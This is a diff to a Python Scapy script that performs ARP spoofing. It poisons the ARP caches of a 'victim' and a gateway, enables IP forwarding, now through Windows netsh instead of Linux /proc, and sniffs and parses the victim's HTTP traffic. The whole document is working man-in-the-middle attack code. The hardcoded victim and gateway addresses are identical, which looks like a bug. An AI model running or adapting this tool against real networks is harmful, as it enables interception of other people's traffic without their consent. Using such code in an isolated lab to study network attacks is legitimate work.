@@ -10,28 +10,31 @@ def help_text():
     sys.exit()
 
 def enable_ip_forwarding():
-    print("\n[*] Enabling IP Forwarding...\n")
-    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    print("\nEnabling IP Forwarding...\n")
+    os.system('netsh interface ipv4 set interface "Ethernet" forwarding=enabled')
 
 def disable_ip_forwarding():
-    print("[*] Disabling IP Forwarding...")
-    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+    print("Disabling IP Forwarding...")
+    os.system('netsh interface ipv4 set interface "Ethernet" forwarding=disabled')
 
 def get_mac(IP, interface):
     conf.verb = 0
-    print(interface)
-    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=2, iface=interface, inter=0.1)
+    print(f"Sending ARP request to {IP} on interface {interface}...")
+    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=2, iface=interface, verbose=False)
     for snd, rcv in ans:
-        return rcv.sprintf(r"%Ether.src%")
+        print(f"Received response from {rcv.psrc} with MAC {rcv.hwsrc}")
+        return rcv.hwsrc
+    return None
 
 def reARP(victimIP, gatewayIP, interface):
-    print("\n[*] Restoring Targets...")
+    print("\nRestoring Targets...")
     victimMAC = get_mac(victimIP, interface)
     gatewayMAC = get_mac(gatewayIP, interface)
-    send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=7)
-    send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewayMAC), count=7)
+    if victimMAC and gatewayMAC:
+        send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=7)
+        send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewayMAC), count=7)
     disable_ip_forwarding()
-    print("[*] Shutting Down...")
+    print("Shutting Down...")
     sys.exit(1)
 
 def trick(gm, vm):
@@ -40,33 +43,34 @@ def trick(gm, vm):
 
 def make_http_request(url):
     try:
-        print(f"[*] Initiating HTTP request to {url} from attacker's computer...")
+        print(f"Initiating HTTP request to {url} from attacker's computer...")
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
         response = requests.get(url, headers=headers)
-        print(f"\n[*] Response from {url}:\n")
         return response
     except requests.RequestException as e:
-        print(f"[!] Error making HTTP request: {str(e)}")
+        print(f"Error making HTTP request: {str(e)}")
         return None
 
 def arp_spoof(victimIP, gatewayIP, interface):
     try:
         victimMAC = get_mac(victimIP, interface)
-    except Exception:
+    except Exception as e:
         disable_ip_forwarding()
-        print("[!] Couldn't Find Victim MAC Address")
-        print("[!] Exiting...")
+        print(f"Couldn't Find Victim MAC Address: {e}")
+        print("Exiting...")
         sys.exit(1)
     
     try:
         gatewayMAC = get_mac(gatewayIP, interface)
-    except Exception:
+    except Exception as e:
         disable_ip_forwarding()
-        print("[!] Couldn't Find Gateway MAC Address")
-        print("[!] Exiting...")
+        print(f"Couldn't Find Gateway MAC Address: {e}")
+        print("Exiting...")
         sys.exit(1)
     
-    print("[*] Poisoning Targets...")    
+    print(f"Victim MAC Address: {victimMAC}")
+    print(f"Gateway MAC Address: {gatewayMAC}")
+    print("Poisoning Targets...")    
     while True:
         try:
             trick(gatewayMAC, victimMAC)
@@ -79,6 +83,7 @@ def packet_handler(packet, http_response):
     if packet.haslayer(IP):
         if packet.haslayer(TCP):
             if packet[TCP].dport == 80 and packet[IP].dst == victimIP:
+                
                 if packet.haslayer(Raw):
                     raw_data = packet[Raw].load.decode('utf-8', 'ignore')
                     if http_response and raw_data.startswith(http_response.text.split('\n')[0]):
@@ -93,32 +98,33 @@ def packet_handler(packet, http_response):
 
 def capture_packets(victimIP, interface, http_response):
     try:
-        print(f"[*] Capturing all packets sent to {victimIP}...")
+        print(f"Capturing all packets sent to {victimIP}...")
         sniff(filter=f"host {victimIP}", prn=lambda x: packet_handler(x, http_response), iface=interface, store=0)
     except KeyboardInterrupt:
-        print("\n[*] Stopping packet capture...")
+        print("\nStopping packet capture...")
         reARP(victimIP, gatewayIP, interface)
 
 if __name__ == '__main__':
-    interface = 'eth0'
-    victimIP = '192.168.1.104'
-    gatewayIP = '192.168.1.104'
-    url_to_request = 'https://www.youtube.com'
+    interface = 'Ethernet' 
+    victimIP = '192.168.1.106'
+    gatewayIP = '192.168.1.106' 
+    url_to_request = 'http://example.com'
     
     enable_ip_forwarding()
     
-    # Start ARP spoofing attack in a separate thread
+
     spoof_thread = threading.Thread(target=arp_spoof, args=(victimIP, gatewayIP, interface))
     spoof_thread.start()
-    
-    # Make HTTP request from attacker's computer (appearing as victim's)
+
+    time.sleep(5)
+
     http_response = make_http_request(url_to_request)
     
-     #Capture all packets sent to victim (HTTP and non-HTTP)
+
     try:
         capture_packets(victimIP, interface, http_response)
     except KeyboardInterrupt:
-        print("\n[*] Stopping packet capture...")
+        print("\nStopping packet capture...")
         reARP(victimIP, gatewayIP, interface)
     
     spoof_thread.join()
